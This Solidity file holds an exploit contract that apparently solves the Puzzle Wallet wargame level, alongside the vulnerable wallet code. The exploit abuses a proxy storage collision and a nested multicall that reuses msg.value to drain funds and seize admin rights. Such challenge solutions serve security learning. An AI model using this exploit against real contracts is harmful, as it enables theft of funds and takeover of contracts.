// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IPuzzleProxy {
    function pendingAdmin() external view returns(address);
    function admin() external view returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
}

contract PuzzleWalletAttacker {
    address public challengeInstance;
    address public attacker;
    PuzzleWallet puzzleProxy;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
        puzzleProxy = PuzzleWallet(_challengeInstance);
        attacker = address(this);
    }

    function attack() external {
        IPuzzleProxy(address(puzzleProxy)).proposeNewAdmin(attacker);
        puzzleProxy.addToWhitelist(challengeInstance);
        puzzleProxy.addToWhitelist(attacker);

        bytes[] memory multicallData_ = new bytes[](2);
        multicallData_[0] = abi.encodeWithSignature("deposit()"); 
        multicallData_[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", payable(msg.sender),  0.002 ether, "");

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()"); 
        multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", multicallData_);

        puzzleProxy.multicall{value:0.001 ether}(multicallData);
        puzzleProxy.setMaxBalance(uint256(uint160(attacker)));
        IPuzzleProxy(address(puzzleProxy)).approveNewAdmin(attacker);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}